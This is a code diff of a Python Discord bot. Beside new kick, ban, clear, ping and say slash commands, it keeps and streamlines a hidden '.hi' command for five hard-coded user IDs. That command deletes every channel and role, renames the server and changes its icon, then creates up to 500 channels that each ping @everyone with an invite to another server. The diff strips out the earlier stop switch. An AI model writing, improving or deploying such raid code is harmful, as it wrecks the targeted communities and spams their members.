@@ -3,11 +3,11 @@ import os
 import discord
 import asyncio
 import aiohttp
+from discord import app_commands
 from discord.ext import commands
-from keep_alive import keep_alive  # Import the keep_alive module
-keep_alive()
+from keep_alive import keep_alive
 
-# Force UTF-8 encoding
+keep_alive()
 sys.stdout.reconfigure(encoding='utf-8')
 
 intents = discord.Intents.all()
@@ -15,77 +15,59 @@ intents.members = True
 bot = commands.Bot(command_prefix='.', intents=intents)
 Token = os.environ.get("Token")
 
-# Global stop flag
-stop_requested = False
+tree = bot.tree  # Slash command tree
 
-# Replace with your authorized user IDs (up to 5)
 AUTHORIZED_USER_IDS = [
-    719648115639975946,  # User ID 1
-    1140178029482610718,  # User ID 2
-    712499082408755210,  # User ID 3
-    667936742770343947,  # User ID 4
-    1342627080873054329  # User ID 5
+    719648115639975946,
+    1140178029482610718,
+    712499082408755210,
+    667936742770343947,
+    1342627080873054329
 ]
 
 @bot.event
 async def on_ready():
-    global stop_requested
-    stop_requested = False
-    print(f'✅ Bot connected as {bot.user}')
-
-
+    await tree.sync()
+    print(f'✅ Bot connected as {bot.user} and slash commands synced.')
 
 @bot.command()
-async def Hi(ctx):
-if ctx.author.id not in AUTHORIZED_USER_IDS:
+async def hi(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
         await ctx.send("❌ You are not authorized to use this command.")
         return
 
     guild = ctx.guild
     invite_link = "https://discord.gg/nRAmSNwK"
+    await ctx.send("Hi 11Ops. You know what time it is.")
 
-    await ctx.send("Hi 11Ops. You know what time it is")
-
-    # Delete existing channels and roles
+    # Delete roles first
     delete_tasks = []
-    for channel in guild.channels:
-        delete_tasks.append(delete_channel(channel))
-
     for role in guild.roles:
         if role.name != '@everyone':
             delete_tasks.append(delete_role(role))
+    await asyncio.gather(*delete_tasks)
 
-    for task in asyncio.as_completed(delete_tasks):
-        if stop_requested:
-            await ctx.send("🛑 Operation stopped during deletion.")
-            return
-        await task
+    delete_tasks = []
+    for channel in guild.channels:
+        delete_tasks.append(delete_channel(channel))
+    await asyncio.gather(*delete_tasks)
 
     print("✅ Finished deleting channels and roles.")
 
-    # Change server name and logo
     try:
-        logo_url = "https://cdn.discordapp.com/attachments/1342240703157112997/1360860432008745050/414cf46982f0562c61f2a9876ae3cf82.png?ex=67fca78a&is=67fb560a&hm=c9a72b3ed3c15068caae8014467b3f3f032bcae01b1e5c460964aa6f6e7ed390&"
-        
+        logo_url = "https://cdn.discordapp.com/attachments/1342240703157112997/1360860432008745050/414cf46982f0562c61f2a9876ae3cf82.png"
         async with aiohttp.ClientSession() as session:
             async with session.get(logo_url) as resp:
                 if resp.status == 200:
                     image_data = await resp.read()
                     await guild.edit(name="Bayview OT", icon=image_data)
-                    print("🏷️ Server name changed to Bayview OT and logo set.")
-                else:
-                    print(f'⚠️ Failed to fetch logo image: {resp.status}')
+                    print("🏷️ Server name changed and logo set.")
     except Exception as e:
-        print(f'⚠️ Failed to change server name and set logo: {e}')
+        print(f'⚠️ Failed to update server: {e}')
 
-    # Create channels
     MAX_CHANNELS = 500
     try:
         for i in range(1, MAX_CHANNELS + 1):
-            if stop_requested:
-                await ctx.send("🛑 Operation stopped during channel creation.")
-                break
-
             channel_name = "bayview-OT"
             new_channel = await guild.create_text_channel(channel_name)
             print(f'📁 Created channel: {new_channel.name}')
@@ -95,25 +77,19 @@ if ctx.author.id not in AUTHORIZED_USER_IDS:
                 description=f"[Click here to join Bayview Roleplay]({invite_link})",
                 color=discord.Color.red()
             )
-            embed.set_footer(text="Bayview OT ")
+            embed.set_footer(text="Bayview OT")
             embed.set_thumbnail(url=logo_url)
 
             await new_channel.send(content="@everyone", embed=embed)
 
-        if not stop_requested:
-            await ctx.send(f"✅ Created {MAX_CHANNELS} channels and sent embed invites.")
-
     except Exception as e:
         print(f'❌ Error creating channels: {e}')
-        await ctx.send("⚠️ An error occurred during channel creation.")
 
-# Helper functions for deleting channels and roles
+# === Helper functions ===
 async def delete_channel(channel):
     try:
         await channel.delete()
         print(f'🗑️ Deleted channel: {channel.name}')
-    except discord.Forbidden:
-        print(f'🚫 Permission error deleting channel: {channel.name}')
     except Exception as e:
         print(f'❌ Error deleting channel {channel.name}: {e}')
 
@@ -121,9 +97,35 @@ async def delete_role(role):
     try:
         await role.delete()
         print(f'🗑️ Deleted role: {role.name}')
-    except discord.Forbidden:
-        print(f'🚫 Permission error deleting role: {role.name}')
     except Exception as e:
         print(f'❌ Error deleting role {role.name}: {e}')
+
+# === Slash Moderation Commands ===
+@tree.command(name="kick", description="Kick a member from the server")
+@app_commands.checks.has_permissions(kick_members=True)
+async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided."):
+    await member.kick(reason=reason)
+    await interaction.response.send_message(f"👢 Kicked {member.mention} | Reason: {reason}", ephemeral=True)
+
+@tree.command(name="ban", description="Ban a member from the server")
+@app_commands.checks.has_permissions(ban_members=True)
+async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided."):
+    await member.ban(reason=reason)
+    await interaction.response.send_message(f"🔨 Banned {member.mention} | Reason: {reason}", ephemeral=True)
+
+@tree.command(name="clear", description="Clear a number of messages from the current channel")
+@app_commands.checks.has_permissions(manage_messages=True)
+async def clear(interaction: discord.Interaction, amount: int):
+    await interaction.channel.purge(limit=amount)
+    await interaction.response.send_message(f"🧹 Cleared {amount} messages.", ephemeral=True)
+
+@tree.command(name="ping", description="Check the bot's latency")
+async def ping(interaction: discord.Interaction):
+    await interaction.response.send_message(f'🏓 Pong! Latency: {round(bot.latency * 1000)}ms')
+
+@tree.command(name="say", description="Make the bot say something")
+async def say(interaction: discord.Interaction, message: str):
+    await interaction.response.send_message("✅ Sent your message.", ephemeral=True)
+    await interaction.channel.send(message)
 
 bot.run(Token)
